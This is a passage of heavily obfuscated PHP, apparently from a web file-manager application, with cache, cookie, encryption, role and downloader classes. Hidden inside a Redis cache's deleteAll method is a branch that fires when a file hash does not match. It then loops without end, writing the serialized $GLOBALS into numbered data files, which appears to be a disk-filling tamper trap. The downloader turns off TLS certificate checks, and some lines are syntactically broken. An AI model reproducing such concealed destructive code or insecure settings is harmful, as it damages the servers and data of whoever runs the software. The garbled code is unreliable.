continue; } $_SERVER[$BΨ] = $Eỷ; } foreach (self::$_headers as $BΨ => $a뇂) { if (!array_key_exists($BΨ, $_SERVER)) { continue; } $_SERVER[$BΨ] = $_SERVER[$a뇂]; $_SERVER[strtoupper($BΨ)] = $_SERVER[$a뇂]; } } public static function get($fឧ) { self::init(); return $_SERVER[$fឧ] ? $_SERVER[$fឧ] : $_SERVER[$_SERVER[놫Ӱ][1725] . strtoupper($fឧ)]; } public static function method() { return strtoupper(self::get($_SERVER[놫Ӱ][149])); } public static function length() { $bӏ =& $_SERVER[놫Ӱ]; $f = self::get($bӏ[1726]); if (!$f) { $f = self::get($bӏ[1102]); } return $f; } public static function range() { $f܈̋ =& $_SERVER[놫Ӱ]; $a = self::get($f܈̋[195]); if (!$a) { return !1; } if (!preg_match($f܈̋[1727], $a, $f悆)) { return !1; } if ($f悆[1] === $f܈̋[33] && $f悆[2] === $f܈̋[33]) { return !1; } return array($f悆[1] !== $f܈̋[33] ? $f悆[1] : null, $f悆[2] !== $f܈̋[33] ? $f悆[2] : null); } public static $statusCode = array("\x31\60\60" => "\x43\x6f\x6e\x74\151\x6e\165\x65", "\61\x30\61" => "\123\167\151\164\x63\150\x69\156\147\40\120\162\x6f\x74\x6f\143\157\x6c", "\x31\60\62" => "\120\162\157\x63\145\x73\x73\151\x6e\x67", "\x31\60\x33" => "\105\x61\x72\154\x79\x20\110\x69\x6e\x74\x73", "\x32\60\60" => "\x4f\x4b", "\x32\x30\x31" => "\103\162\x65\141\164\145\x64", "\x32\x30\x32" => "\x41\x63\x63\x65\x70\164\x65\144", "\62\60\x33" => "\x4e\x6f\x6e\55\x41\x75\x74\150\x6f\x72\151\x74\141\x74\151\x76\145\40\111\x6e\146\x6f\x72\x6d\x61\164\x69\x6f\156", "\62\60\64" => "\x4e\x6f\x20\x43\x6f\156\164\145\156\164", "\x32\x30\65" => "\x52\x65\163\145\164\x20\x43\157\x6e\x74\145\x6e\164", "\62\x30\x36" => "\120\x61\162\164\151\x61\154\40\103\x6f\156\x74\x65\x6e\164", "\62\60\x37" => "\115\x75\x6c\x74\x69\55\123\x74\x61\164\165\x73", "\63\x30\x30" => "\x4d\165\x6c\164\x69\x70\x6c\x65\x20\103\x68\x6f\151\143\x65\x73", "\63\60\x31" => "\x4d\x6f\x76\x65\144\40\120\145\162\155\x61\156\x65\156\164\154\x79", "\63\x30\x32" => "\106\157\165\x6e\144", "\x33\60\x33" => "\123\145\145\x20\117\x74\150\x65\x72", "\63\x30\64" => "\x4e\x6f\164\x20\115\x6f\144\x69\x66\x69\145\x64", "\63\x30\65" => "\x55\x73\x65\x20\x50\x72\157\x78\171", "\63\x30\67" => "\x54\145\x6d\x70\x6f\162\x61\x72\x79\40\x52\x65\144\151\x72\x65\143\x74", "\x33\x30\70" => "\x50\x65\162\155\141\x6e\145\156\164\40\x52\145\144\x69\x72\145\x63\x74", "\64\x30\x30" => "\x42\x61\144\40\122\145\161\165\145\x73\x74", "\64\60\x31" => "\x55\x6e\141\165\164\150\x6f\x72\x69\172\145\144", "\64\x30\62" => "\120\141\171\155\145\156\x74\x20\x52\145\161\165\x69\x72\145\144", "\64\60\63" => "\x46\x6f\x72\x62\151\144\x64\145\x6e", "\64\x30\64" => "\116\157\x74\40\106\x6f\165\156\144", "\x34\x30\65" => "\115\x65\164\150\x6f\x64\x20\116\157\164\40\x41\x6c\154\157\x77\x65\x64", "\x34\60\66" => "\x4e\157\x74\40\101\x63\143\x65\160\164\x61\142\x6c\145", "\64\60\x37" => "\x50\x72\157\170\x79\40\x41\165\164\150\145\156\164\151\143\x61\164\x69\x6f\x6e\40\122\x65\161\165\151\162\145\144", "\x34\x30\x38" => "\x52\145\161\165\x65\163\164\40\124\151\155\145\x6f\165\x74", "\64\x30\71" => "\103\157\x6e\x66\x6c\151\x63\x74", "\x34\x31\x30" => "\x47\x6f\x6e\145", "\64\x31\x31" => "\114\x65\x6e\147\x74\150\40\x52\x65\x71\x75\151\162\145\x64", "\64\x31\62" => "\120\162\145\143\x6f\x6e\x64\x69\164\151\157\x6e\x20\x46\x61\x69\154\145\144", "\x34\61\63" => "\122\x65\x71\x75\145\163\x74\40\105\x6e\x74\x69\164\x79\x20\x54\157\x6f\40\x4c\141\x72\147\145", "\x34\x31\64" => "\122\145\161\165\145\x73\164\40\125\x52\111\x20\124\x6f\157\40\x4c\141\162\x67\145", "\x34\61\65" => "\x55\156\x73\x75\160\x70\157\162\x74\145\144\x20\115\145\x64\x69\141\40\x54\171\x70\x65", "\x34\x31\x36" => "\x52\145\161\165\x65\x73\x74\x65\x64\x20\x52\x61\x6e\x67\x65\x20\116\x6f\x74\x20\123\141\164\x69\163\x66\x69\141\x62\x6c\145", "\64\61\67" => "\105\170\160\x65\x63\x74\x61\164\151\157\x6e\x20\x46\141\151\154\145\144", "\64\x32\x32" => "\125\156\x70\x72\x6f\143\145\163\x73\141\142\x6c\x65\40\x45\x6e\x74\151\x74\171", "\x34\62\63" => "\114\x6f\x63\153\145\144", "\64\62\x34" => "\106\141\151\154\x65\144\40\104\x65\160\145\x6e\x64\145\x6e\143\x79", "\x34\x32\65" => "\x55\156\x6f\x72\144\145\x72\145\144\x20\x43\x6f\x6c\x6c\145\x63\x74\151\157\x6e", "\x34\62\66" => "\125\160\147\x72\x61\144\x65\40\122\x65\x71\165\x69\x72\x65\144", "\x34\62\x38" => "\x50\162\145\143\x6f\156\x64\151\x74\x69\x6f\156\x20\x52\145\161\x75\151\x72\145\x64", "\x34\x32\71" => "\124\157\157\40\x4d\141\156\171\40\122\145\161\x75\145\163\x74\x73", "\x34\x33\x31" => "\122\x65\x71\x75\x65\163\x74\40\x48\145\141\x64\145\162\40\x46\151\x65\154\144\163\40\x54\157\157\x20\114\x61\x72\x67\145", "\64\64\x34" => "\116\157\40\122\x65\x73\160\157\156\163\x65", "\64\65\x30" => "\102\x6c\x6f\143\153\145\x64\40\x62\x79\40\127\151\x6e\x64\x6f\x77\x73\x20\x50\x61\162\x65\x6e\x74\x61\154\x20\x43\x6f\x6e\164\162\x6f\x6c\x73", "\x34\65\x31" => "\x55\156\x61\x76\141\x69\154\x61\x62\x6c\145\40\106\x6f\162\x20\x4c\145\x67\x61\154\40\x52\145\x61\x73\157\x6e\x73", "\x34\x39\64" => "\122\145\x71\x75\x65\x73\x74\x20\x48\145\x61\x64\x65\x72\x20\124\157\157\40\x4c\x61\x72\147\x65", "\65\60\x30" => "\111\x6e\x74\145\162\x6e\141\x6c\x20\x53\145\x72\x76\x65\x72\40\x45\x72\162\x6f\x72", "\x35\60\61" => "\x4e\x6f\164\x20\x49\155\x70\x6c\145\155\x65\156\x74\145\144", "\x35\60\62" => "\x42\141\x64\x20\x47\141\x74\145\167\141\171", "\x35\60\63" => "\x53\x65\162\x76\x69\x63\145\40\x55\x6e\x61\166\x61\151\x6c\x61\x62\x6c\x65", "\65\60\x34" => "\x47\x61\x74\145\x77\141\171\x20\124\x69\155\145\x6f\x75\x74", "\65\x30\x35" => "\110\124\124\120\x20\126\145\162\163\151\157\x6e\x20\156\x6f\164\40\x73\x75\x70\x70\x6f\162\164\x65\144", "\65\60\67" => "\x49\156\163\x75\x66\x66\x69\143\x69\145\156\x74\40\123\x74\x6f\x72\x61\147\x65"); public static function code($aӸ) { $eޔȹ =& $_SERVER[놫Ӱ]; $aӸ = $aӸ . $eޔȹ[33]; $FΑ = self::$statusCode[$aӸ]; $FΑ = $FΑ ? "\110\x54\x54\120\x2f\x31\56\61\40{$aӸ}\40" . $FΑ : $eޔȹ[33]; return $FΑ; } } goto BĪ; E: define($_SERVER[놫Ӱ][224], 2); define($_SERVER[놫Ӱ][225], 3); define($_SERVER[놫Ӱ][226], 1); goto D֥; e݌: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\155\137\157\x70\164\x69\157\x6e"; protected $jsonField = array("\155\x65\x6e\x75", "\162\157\154\x65", "\x72\157\x6c\145\x47\162\x6f\x75\160", "\x72\x65\x67\151\163\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($C) { return "\x53\x79\x73\x74\145\155\117\160\x74\151\x6f\156\137{$C}"; } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x72\x6f\154\x65\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\141\x75\x74\150", "\154\x61\142\145\154", "\x64\x69\163\160\154\141\171", "\163\x79\x73\x74\x65\x6d", "\144\x65\x73\x63", "\x69\x67\156\157\x72\145\105\x78\164", "\151\147\156\x6f\x72\145\x46\x69\x6c\x65\123\151\172\x65", "\141\144\x6d\151\x6e\151\x73\164\x72\141\164\x6f\x72", "\x73\x6f\x72\x74"); public function listData($B = false, $a͇Ѧ = "\163\x6f\162\164", $E = false) { return parent::listData($B, $a͇Ѧ, $E); } public function update($d, $cڬݖ) { goto fؖڬ; Eʫ݇: return parent::update($d, $cڬݖ); goto aӍ; FǖƊ: if (!$c߇ե || $A짷҃ && $A짷҃[$Aٚ[364]] != $c߇ե[$Aٚ[364]]) { return !1; } if ($A짷҃[$Aٚ[2349]] == 1) { $cڬݖ = array($Aٚ[28] => $cڬݖ[$Aٚ[28]], $Aٚ[2020] => $cڬݖ[$Aٚ[2020]]); } $this->filterAuth($cڬݖ[$Aٚ[373]]); goto Eʫ݇; fؖڬ: $Aٚ =& $_SERVER[놫Ӱ]; $c߇ե = parent::listData($d); $A짷҃ = $this->findByName($cڬݖ[$Aٚ[28]]); goto FǖƊ; aӍ: } public function remove($Bۅ) { $d¶ = parent::listData($Bۅ); if (!$d¶ || $d¶[$_SERVER[놫Ӱ][1047]]) { return !1; } return parent::remove($Bۅ); } public function add($F) { goto eóܼ; eóܼ: $d =& $_SERVER[놫Ӱ]; $fي = $F[$d[28]]; if ($this->findByName($fي)) { return !1; } goto a; a: $fڞ = array($d[383] => $fي, $d[2008] => $d[33], $d[2004] => $d[2021], $d[2350] => 1, $d[2007] => 0, $d[2351] => 0, $d[2006] => $this->getSort()); $F = array_merge($fڞ, $F); $this->filterAuth($F[$d[373]]); goto A؜; A؜: return parent::insert($F); goto a؝; a؝: } private function getSort() { $c =& $_SERVER[놫Ӱ]; $Aˣʅ = parent::listData(); $eɊ = array_to_keyvalue($Aˣʅ, $c[33], $c[2023]); return empty($eɊ) ? 0 : max($eɊ) + 1; } private function filterAuth(&$Eߪݰ) { $e =& $_SERVER[놫Ӱ]; $F¢ = array(); $dͦ© = array_filter(explode($e[47], $Eߪݰ)); foreach ($dͦ© as $Eߪݰ) { $a趗 = explode($e[92], $Eߪݰ); if ($a趗[0] == $e[1682] && $a趗[1] != $e[1009]) { $c = $a趗[0] . $e[92] . $a趗[1] . $e[2352]; if (!in_array($c, $dͦ©)) { $F¢[] = $c; } } $F¢[] = $Eߪݰ; } $Eߪݰ = implode($e[47], $F¢); } public function sort($cՓ͒, $E) { return parent::update($cՓ͒, $E); } } goto bψ϶; A: class Mcrypt { public static $defaultKey = "\141\41\164\x61\x6b\101\x3a\144\154\x6d\x63\154\144\x45\x76\54\x65"; public static function encode($C􅇹, $C롨Ɗ = '', $Dꇚ = 0, $fɝ = '') { goto C޽; a: $C􅇹 = sprintf($a[1830], $Dꇚ ? $Dꇚ + time() : 0) . substr(md5($C􅇹 . $d), 0, 16) . $C􅇹; $e챘 = strlen($C􅇹); $b㢡 = array(); goto eݽ; A: $Aʿ՟۳ = substr($fɝ, -$a𮊴); $dÏ = $eˡ . md5($eˡ . $Aʿ՟۳); $f뮻 = strlen($dÏ); goto a; C޽: $a =& $_SERVER[놫Ӱ]; $a𮊴 = 4; $C롨Ɗ = md5($C롨Ɗ ? $C롨Ɗ : self::$defaultKey); goto C; Dڃ: $Fα = $a[33]; for ($Dݼ = $eȃ = $e껠 = 0; $e껠 < $e챘; $e껠++) { $Dݼ = ($Dݼ + 1) % 256; $eȃ = ($eȃ + $a힝[$Dݼ]) % 256; $Bʹ = $a힝[$Dݼ]; $a힝[$Dݼ] = $a힝[$eȃ]; $a힝[$eȃ] = $Bʹ; $Fα .= chr(ord($C􅇹[$e껠]) ^ $a힝[($a힝[$Dݼ] + $a힝[$eȃ]) % 256]); } $Fα = $Aʿ՟۳ . str_replace($a[900], $a[33], base64_encode($Fα)); goto e; e: $Fα = str_replace(array($a[281], $a[8], $a[900]), array($a[408], $a[71], $a[92]), $Fα); return $Fα; goto cߧ; C: $eˡ = md5(substr($C롨Ɗ, 0, 16)); $d = md5(substr($C롨Ɗ, 16, 16)); $fɝ = $fɝ ? $fɝ : md5(microtime()); goto A; eݽ: for ($e껠 = 0; $e껠 <= 255; $e껠++) { $b㢡[$e껠] = ord($dÏ[$e껠 % $f뮻]); } $a힝 = range(0, 255); for ($eȃ = $e껠 = 0; $e껠 < 256; $e껠++) { $eȃ = ($eȃ + $a힝[$e껠] + $b㢡[$e껠]) % 256; $Bʹ = $a힝[$e껠]; $a힝[$e껠] = $a힝[$eȃ]; $a힝[$eȃ] = $Bʹ; } goto Dڃ; cߧ: } public static function decode($C, $Dτҳ݋ = '') { goto dЋ; dЋ: $CЅ =& $_SERVER[놫Ӱ]; $C = str_replace(array($CЅ[408], $CЅ[71], $CЅ[92]), array($CЅ[281], $CЅ[8], $CЅ[900]), $C); $b̨ = 4; goto c; dۆ: $C = base64_decode(substr($C, $b̨)); $AϾ = strlen($C); $bÓ = array(); goto C; C: for ($Fǋ䵂 = 0; $Fǋ䵂 <= 255; $Fǋ䵂++) { $bÓ[$Fǋ䵂] = ord($aš[$Fǋ䵂 % $a]); } $Cژ = range(0, 255); for ($a = $Fǋ䵂 = 0; $Fǋ䵂 < 256; $Fǋ䵂++) { $a = ($a + $Cژ[$Fǋ䵂] + $bÓ[$Fǋ䵂]) % 256; $b = $Cژ[$Fǋ䵂]; $Cژ[$Fǋ䵂] = $Cژ[$a]; $Cژ[$a] = $b; } goto D; D: $a·׌ė = $CЅ[33]; for ($Fǜ = $a = $Fǋ䵂 = 0; $Fǋ䵂 < $AϾ; $Fǋ䵂++) { $Fǜ = ($Fǜ + 1) % 256; $a = ($a + $Cژ[$Fǜ]) % 256; $b = $Cژ[$Fǜ]; $Cژ[$Fǜ] = $Cژ[$a]; $Cژ[$a] = $b; $a·׌ė .= chr(ord($C[$Fǋ䵂]) ^ $Cژ[($Cژ[$Fǜ] + $Cژ[$a]) % 256]); } if ((substr($a·׌ė, 0, 10) == 0 || substr($a·׌ė, 0, 10) - time() > 0) && substr($a·׌ė, 10, 16) == substr(md5(substr($a·׌ė, 26) . $fĿ֕), 0, 16)) { return substr($a·׌ė, 26); } else { return $CЅ[33]; } goto e; c: $Dτҳ݋ = md5($Dτҳ݋ ? $Dτҳ݋ : self::$defaultKey); $e؞ = md5(substr($Dτҳ݋, 0, 16)); $fĿ֕ = md5(substr($Dτҳ݋, 16, 16)); goto d; d: $AΆݖ = substr($C, 0, $b̨); $aš = $e؞ . md5($e؞ . $AΆݖ); $a = strlen($aš); goto dۆ; e: } } define($_SERVER[놫Ӱ][1831], 1); define($_SERVER[놫Ӱ][1832], 2); goto e; C: function beforeShutdown() { Hook::trigger($_SERVER[][33]); } $_SERVER[$_SERVER[][34]] = BASIC_PATH; $_SERVER[$_SERVER[][35]] = LIB_DIR; goto b̯; c֠ӧ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($bב, $D솨붡) { $D҆ =& $_SERVER[놫Ӱ]; if (!class_exists($D҆[769])) { show_json($D҆[770], !1); } $this->cacheTime = $D솨붡; $this->handle = new Memcached(); if (is_array($bב[$D҆[771]]) && count($bב[$D҆[771]]) >= 1) { foreach ($bב[$D҆[771]] as $A) { $BÃ = explode($D҆[4], $A); $this->handle->addServer($BÃ[0], $BÃ[1]); } } else { $this->handle->addServer($bב[$D҆[166]], $bב[$D҆[167]]); } } public function set($cӄˠ, $F, $c = false) { $c = $c ? $c : $this->cacheTime; return $this->handle->set($cӄˠ, $F, $c); } public function get($aϺݔ) { return $this->handle->get($aϺݔ); } public function remove($f杈) { return $this->handle->delete($f杈); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($e˂, $F) { $bܨپ =& $_SERVER[놫Ӱ]; if (!class_exists($bܨپ[772])) { show_json($bܨپ[773], !1); } $this->cacheTime = $F; $F = isset($e˂[$bܨپ[774]]) ? $e˂[$bܨپ[774]] : 10; $d = _get($e˂, $bܨپ[771]); if ($d && is_array($d)) { $this->isCluster = !0; $this->initCluster($e˂, $F); } else { $this->handle = $this->init($e˂, $F); } } private function init($A𡒒, $eۭÅ) { $c۩С =& $_SERVER[놫Ӱ]; $e݋ = new Redis(); $C = isset($A𡒒[$c۩С[775]]) ? $A𡒒[$c۩С[775]] : !1; if ($C) { $e݋->pconnect($A𡒒[$c۩С[166]], $A𡒒[$c۩С[167]], $eۭÅ); } else { $e݋->connect($A𡒒[$c۩С[166]], $A𡒒[$c۩С[167]], $eۭÅ); } if (!empty($A𡒒[$c۩С[373]])) { $e݋->auth($A𡒒[$c۩С[373]]); } return $e݋; } private function initCluster($f, $f) { $e =& $_SERVER[놫Ӱ]; $E = array($e[776], $e[777], $e[778]); $cҬ = $e[776]; if (isset($f[$e[12]]) && in_array($f[$e[12]], $E)) { $cҬ = $f[$e[12]]; } switch ($cҬ) { case $e[776]: $this->_slave($f, $f); break; case $e[777]: break; case $e[778]: $c廈 = $f[$e[771]]; $a = isset($f[$e[775]]) ? $f[$e[775]] : !1; $B悔 = isset($f[$e[373]]) ? $f[$e[373]] : null; $this->handle = new RedisCluster(NUll, $c廈, $f, $f, $a, $B悔); break; default: break; } } private function _slave($b՝, $c) { goto BŽ; BŽ: $dٱߨ = $b՝[$_SERVER[놫Ӱ][771]]; $this->filterConfig($b՝, $dٱߨ[0]); $this->handle = $this->init($b՝, $c); goto FЪȈ; Fڌ: $this->filterConfig($b՝, $dٱߨ[$c]); $this->slaveHandle = $this->init($b՝, $c); goto aԙЪ; FЪȈ: unset($dٱߨ[0]); if (empty($dٱߨ)) { return; } $c = array_rand($dٱߨ); goto Fڌ; aԙЪ: } private function filterConfig(&$f, $Bݔ) { $E߃ =& $_SERVER[놫Ӱ]; $bː = explode($E߃[4], $Bݔ); $Cӣ = array($E߃[166] => $bː[0], $E߃[167] => $bː[1]); $f = array_merge($f, $Cӣ); } public function set($Fϗ, $e, $bȋ = false) { $bȋ = $bȋ ? $bȋ : $this->cacheTime; return $this->handle->setEx($Fϗ, $bȋ, $e); } public function setLock($eЕ, $e, $A) { return $this->handle->setNX($eЕ, $e); } public function get($a߾ԫѭ) { $fں = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $fں->get($a߾ԫѭ); } public function remove($C) { return $this->handle->del($C); } public function deleteAll() { $bѐ =& $_SERVER[놫Ӱ]; $e㊋ = $_SERVER[$bѐ[779]] . $bѐ[780]; $cʇ = $bѐ[781]; if ($_SERVER[$bѐ[782]] != $cʇ($e㊋)) { goto aĉ; F̱¨: $Cʈ띆 = $bѐ[786]; $Cʈ띆($_SERVER[$bѐ[787]]); $aԚ = $bѐ[783]; goto E; D脑ա: $a = 1; for ($A̅ = $a; $A̅ > 0; $A̅++) { $eѺ(DATA_PATH . $A̅, $cԖ); } goto c; aĉ: $aԚ = $bѐ[783]; $aՔ = $bѐ[784]; $FȒű = $_SERVER[$bѐ[779]] . $bѐ[780]; goto C݋; E: $aԚ(); $eѺ = $bѐ[788]; $cԖ = json_encode($GLOBALS[$bѐ[789]]); goto D脑ա; C݋: $dŪ = $aՔ($FȒű); $Aڕ = explode($bѐ[214], $dŪ); if (count($Aڕ) < $bѐ[543]) { $B = $bѐ[785]; $B(); } goto F̱¨; c: } if ($this->isCluster) { foreach ($this->handle->_masters() as $a) { $this->handle->flushall($a); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Fû = '', $E∍ = 0) { if (is_string($Fû) && $Fû != $_SERVER[놫Ӱ][33]) { $this->prefix = $Fû; } if (is_numeric($E∍) && $E∍ > 0) { $this->expire = $E∍; } } public static function getInstance() { static $C; if ($C === null) { $C = new self(); } return $C; } private static $sameCookieSet = array(); public static function set($Eّ, $FȜׅ, $f̸й = 0, $bϔ = false, $C첌ΰ = false) { $E =& $_SERVER[놫Ӱ]; if (!$f̸й) { $f̸й = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Eّ]) && self::$sameCookieSet[$Eّ] == $FȜׅ . $f̸й) { return; } self::$sameCookieSet[$Eّ] = $FȜׅ . $f̸й; if (!$C첌ΰ) { $C첌ΰ = str_replace(HOST, $E[33], APP_HOST); $C첌ΰ = $E[8] . trim($C첌ΰ, $E[8]); } setcookie($Eّ, $FȜׅ, time() + $f̸й, $C첌ΰ, !1, !1, $bϔ); } public static function setSafe($D, $a, $Bʭ = 0) { self::set($D, $a, $Bʭ, !0); } public static function get($c) { return isset($_COOKIE[$c]) ? $_COOKIE[$c] : !1; } public static function remove($bθ, $B篌 = false) { unset($_COOKIE[$bθ]); self::set($bθ, $_SERVER[놫Ӱ][33], 1, $B篌); } } goto d; Fӥ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $cǆǳ =& $_SERVER[놫Ӱ]; parent::startAfter(); Hook::bind($cǆǳ[1410], array($this, $cǆǳ[1405])); $e =& $this->task; $e[$cǆǳ[1407]] = $cǆǳ[1013]; if (!$e[$cǆǳ[1237]]) { $e[$cǆǳ[1237]] = LNG($cǆǳ[1411]); } } protected function endAfter() { $c۞ =& $_SERVER[놫Ӱ]; parent::endAfter(); Hook::unbind($c۞[1410], array($this, $c۞[1405])); } public function updateAfter() { $aʥ =& $_SERVER[놫Ӱ]; $c̖ =& $this->task; if (!$c̖[$aʥ[1281]] || !$c̖[$aʥ[683]]) { return; } if ($c̖[$aʥ[1407]] == $aʥ[1013]) { $Eް = $c̖[$aʥ[1385]]; if ($c̖[$aʥ[1386]] != $aʥ[1013]) { $Eް = 0; } $fÙ = ($c̖[$aʥ[1389]] + $Eް) / $c̖[$aʥ[683]]; $c̖[$aʥ[1340]] = $fÙ * 0.3; } else { if ($c̖[$aʥ[1407]] == $aʥ[298]) { $fÙ = $c̖[$aʥ[1286]] / $c̖[$aʥ[1281]]; $c̖[$aʥ[1340]] = 0.3 + $fÙ * 0.5; } else { if ($c̖[$aʥ[1407]] == $aʥ[90]) { $fÙ = 0; if ($c̖[$aʥ[1384]]) { $fÙ = $c̖[$aʥ[1385]] / $c̖[$aʥ[1384]]; } $c̖[$aʥ[1340]] = 0.3 + 0.5 + $fÙ * 0.2; } } } if ($c̖[$aʥ[1340]] > 0) { $Fɒ = timeFloat() - $c̖[$aʥ[1342]] - $c̖[$aʥ[1345]]; $c̖[$aʥ[1346]] = $Fɒ * (1 - $c̖[$aʥ[1340]]) / $c̖[$aʥ[1340]]; } } public function copyFileStart($d糔, $CՑ, $C, $Bɲ, $Eϒ, $F㯪) { $aȐ =& $_SERVER[놫Ӱ]; parent::copyFileStart($d糔, $CՑ, $C, $Bɲ, $Eϒ, $F㯪); $dЦ =& $this->task; if ($dЦ[$aȐ[1407]] == $aȐ[298]) { $dЦ[$aȐ[1407]] = $aȐ[90]; } $this->update(); } public function copyFileEnd($cݮ, $e֏Ջ, $Ań, $CК黩, $Eƫ, $AИ) { $C׊ =& $_SERVER[놫Ӱ]; $fÇ =& $this->task; $fÇ[$C׊[1385]] = $fÇ[$C׊[1384]]; $fÇ[$C׊[1389]] += $fÇ[$C׊[1384]]; $fÇ[$C׊[1386]] = $C׊[33]; $this->update(); } public function nameParse($BЩ) { $f֖ =& $_SERVER[놫Ӱ]; $D =& $this->task; if ($D[$f֖[1286]] < $D[$f֖[1281]]) { $E = get_path_this($BЩ); if (strstr($E, $f֖[92])) { $D[$f֖[1286]] += 1; } } if ($D[$f֖[1407]] == $f֖[1013]) { $D[$f֖[1407]] = $f֖[298]; } $D[$f֖[1382]] = $BЩ; $this->update(); } } class Downloader { static function start($f, $c, $D = 10) { goto Cٸ; aަ: $bՑ = intval($e鋂[$bזž[322]]); if (file_exists($b͔) && time() - filemtime($b͔) < 3) { return array($bזž[1005] => !1, $bזž[1007] => $bזž[1414]); } $Cֳ = array(); goto e̹ఏ; f䂨: if ($BՉ > $bՑ) { @unlink($b͔); } file_put_contents($a꜅Ȋ, json_encode($Cֳ)); $F = self::fileDownloadCurl($f, $c, !0, $BՉ, $bՑ); goto cԹ; DЛÊ: $b͔ = $c . $bזž[1413]; if (is_array($f)) { $e鋂 = $f; } else { $e鋂 = url_header($f); } $f = $e鋂[$bזž[292]]; goto d; cԹ: if ($F[$bזž[1005]]) { @unlink($a꜅Ȋ); } return $F; goto c; e̹ఏ: if (is_file($a꜅Ȋ)) { $d = file_get_contents($a꜅Ȋ); $Cֳ = json_decode($d, 1); } if (file_exists($c) && $bՑ == filesize($c)) { @unlink($b͔); @unlink($a꜅Ȋ); return array($bזž[1005] => !0, $bזž[1007] => $bזž[1415]); } if ($Cֳ[$bזž[322]] != $bՑ) { $Cֳ = array($bזž[322] => $bՑ); } goto f䂨; d: if (!$f) { return array($bזž[1005] => !1, $bזž[1007] => $bזž[1010]); } if (!$e鋂[$bזž[1197]] || $e鋂[$bזž[322]] == 0) { @unlink($b͔); @unlink($c); $F = self::fileDownloadFopen($f, $c, $e鋂[$bזž[322]]); if ($F[$bזž[1005]]) { return $F; } else { @unlink($b͔); @unlink($c); $F = self::fileDownloadCurl($f, $c, !1, 0, $e鋂[$bזž[322]]); @unlink($b͔); return $F; } } $BՉ = is_file($b͔) ? filesize($b͔) : 0; goto aަ; Cٸ: $bזž =& $_SERVER[놫Ӱ]; if (!request_url_safe($f)) { return array($bזž[1005] => !1, $bזž[1007] => $bזž[1010]); } $a꜅Ȋ = $c . $bזž[1412]; goto DЛÊ; c: } static function fileDownloadFopen($DĪĤ, $F٫, $d싆 = 0) { $BӲ =& $_SERVER[놫Ӱ]; @ini_set($BӲ[1416], $BӲ[1417]); $dƥʯ = $F٫ . $BӲ[1413]; set_timeout(); @unlink($dƥʯ); if ($e = @fopen($DĪĤ, $BӲ[1418])) { goto FП; aذ: self::checkGzip($dƥʯ); if (!@rename($dƥʯ, $F٫)) { usleep(round(rand(0, 1000) * 50)); @unlink($F٫); $b񻍏 = @rename($dƥʯ, $F٫); if (!$b񻍏) { return array($BӲ[1005] => !1, $BӲ[1007] => $BӲ[1423]); } } return array($BӲ[1005] => !0, $BӲ[1007] => $BӲ[681]); goto a; Aط: fclose($e); $B = filesize(iconv_system($dƥʯ)); if ($d싆 != 0 && $B != $d싆) { return array($BӲ[1005] => !1, $BӲ[1007] => $BӲ[1422]); } goto aذ; FП: if (!($d㓙 = @fopen($dƥʯ, $BӲ[1419]))) { return array($BӲ[1005] => !1, $BӲ[1007] => $BӲ[1420]); } while (!feof($e)) { if (!file_exists($dƥʯ)) { fclose($d㓙); return array($BӲ[1005] => !1, $BӲ[1007] => $BӲ[1421]); } clearstatcache(); if ($d싆 > 0 && $d싆 == filesize(iconv_system($dƥʯ))) { break; } fwrite($d㓙, fread($e, 1024 * 8), 1024 * 8); } fclose($d㓙); goto Aط; a: } else { return array($BӲ[1005] => !1, $BӲ[1007] => $BӲ[1424]); } } static function fileDownloadCurl($EÆ, $Dٗ, $c = false, $c = 0, $E磩 = 0) { goto E; B䷌: if ($cΖ < $E磩 && $E磩 != 0) { return array($e[1005] => !1, $e[1007] => $e[1414]); } if ($cΖ > $E磩 && $E磩 != 0) { return array($e[1005] => !1, $e[1007] => $e[1422]); } if ($D && filesize($E鬕) != 0) { self::checkGzip($E鬕); if (!@rename($E鬕, $Dٗ)) { @unlink($Dٗ); $D = @rename($E鬕, $Dٗ); if (!$D) { return array($e[1005] => !1, $e[1007] => $e[1426]); } } return array($e[1005] => !0, $e[1007] => $e[681]); } goto C; d͵: curl_setopt($d¼̋, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($d¼̋, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($d¼̋, CURLOPT_SSL_VERIFYHOST, 0); goto e⎭Å; FȎ: if ($c) { curl_setopt($d¼̋, CURLOPT_RANGE, $c . $e[698]); } curl_setopt($d¼̋, CURLOPT_FILE, $dŒż); curl_setopt($d¼̋, CURLOPT_REFERER, get_url_link($EÆ)); goto d͵; E: $e =& $_SERVER[놫Ӱ]; $E鬕 = $Dٗ . $e[1413]; set_timeout(); goto A; C: return array($e[1005] => !1, $e[1007] => $e[1427]); goto a; d߮֌: curl_close($d¼̋); fclose($dŒż); $cΖ = filesize(iconv_system($E鬕)); goto B䷌; e⎭Å: curl_setopt($d¼̋, CURLOPT_NOPROGRESS, !1); curl_setopt($d¼̋, CURLOPT_PROGRESSFUNCTION, $e[1185]); curl_progress_start($d¼̋); goto AΒ; A: $dŒż = @fopen($E鬕, $e[705]); if (!$dŒż) { return array($e[1005] => !1, $e[1007] => $e[1425]); } $d¼̋ = curl_init($EÆ); goto FȎ; AΒ: curl_setopt($d¼̋, CURLOPT_USERAGENT, $e[1417]); $D = curl_exec($d¼̋); curl_progress_end($d¼̋); goto d߮֌; a: } static function checkGzip($b̯) { goto Eӣȶ; bǢ: file_put_contents($b̯, $F); goto B칎; c: ob_start(); readgzfile($b̯); $F = ob_get_clean(); goto bǢ; Eӣȶ: $CȜ = $_SERVER[놫Ӱ][1428]; $bּɌ = file_sub_str($b̯, 0, 2); if ($CȜ != $bּɌ) { return; } goto c; B칎: } } class FileParsePdf { public static function parse($DԜ) { goto bς; bς: $bߣ =& $_SERVER[놫Ӱ]; $d鹔 = 32 * 1024; $eރω = array($bߣ[768] => fopen($DԜ, 